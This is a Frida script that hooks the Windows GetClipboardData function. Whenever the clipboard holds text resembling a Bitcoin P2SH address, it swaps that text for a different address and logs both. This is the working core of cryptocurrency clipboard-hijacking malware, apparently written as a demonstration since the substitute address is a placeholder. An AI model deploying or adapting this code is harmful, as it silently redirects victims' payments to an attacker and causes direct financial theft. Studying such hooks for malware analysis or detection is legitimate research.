var user32_GetClipboardData = Module.findExportByName("user32.dll", "GetClipboardData")// Attach a hook to the native pointer

Interceptor.attach(user32_GetClipboardData, {
    onEnter: function (args, state) {
        this.uFormat = args[0].toInt32();
    },
 
    onLeave: function (retval) {
        var formatName = getClipboardFormatName(this.uFormat);
        console.log(`[+] GetClipboardData(${formatName}) => ${retval}`);
        
        if (!retval.isNull() && formatName == 'CF_UNICODETEXT') {
          var original = retval.readUtf16String();
          if (isValidP2SHAddress(original)) {
            console.log("[+] Captured address: " + original);
            const modified = '3ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456';
            console.log("[+] Modified address: " + modified);
            retval.writeUtf16String(modified);
          }
        }
    }
});

function getClipboardFormatName(cf) {
    switch (cf) {
        case 1:  return 'CF_TEXT';
        case 2:  return 'CF_BITMAP';
        case 3:  return 'CF_METAFILEPICT';
        case 4:  return 'CF_SYLK';
        case 5:  return 'CF_DIF';
        case 6:  return 'CF_TIFF';
        case 7:  return 'CF_OEMTEXT';
        case 8:  return 'CF_DIB';
        case 9:  return 'CF_PALETTE';
        case 10: return 'CF_PENDATA';
        case 11: return 'CF_RIFF';
        case 12: return 'CF_WAVE';
        case 13: return 'CF_UNICODETEXT';
        case 14: return 'CF_ENHMETAFILE';
        case 15: return 'CF_HDROP';
        case 16: return 'CF_LOCALE';
        case 17: return 'CF_DIBV5';

        case 0x0080: return 'CF_OWNERDISPLAY';
        case 0x0081: return 'CF_DSPTEXT';
        case 0x0082: return 'CF_DSPBITMAP';
        case 0x0083: return 'CF_DSPMETAFILEPICT';
        case 0x008E: return 'CF_DSPENHMETAFILE';
        case 0x0200: return 'CF_PRIVATEFIRST';
        case 0x02FF: return 'CF_PRIVATELAST';
        case 0x0300: return 'CF_GDIOBJFIRST';
        case 0x03FF: return 'CF_GDIOBJLAST';

        default: return 'CF_UNKNOWN';
    }
}

function isValidP2SHAddress(addr) {
    //sample address 3P14159f73E4gFr7JterCCQh9QjiTjiZrG
    return addr.length == 34 && addr.startsWith('3');
}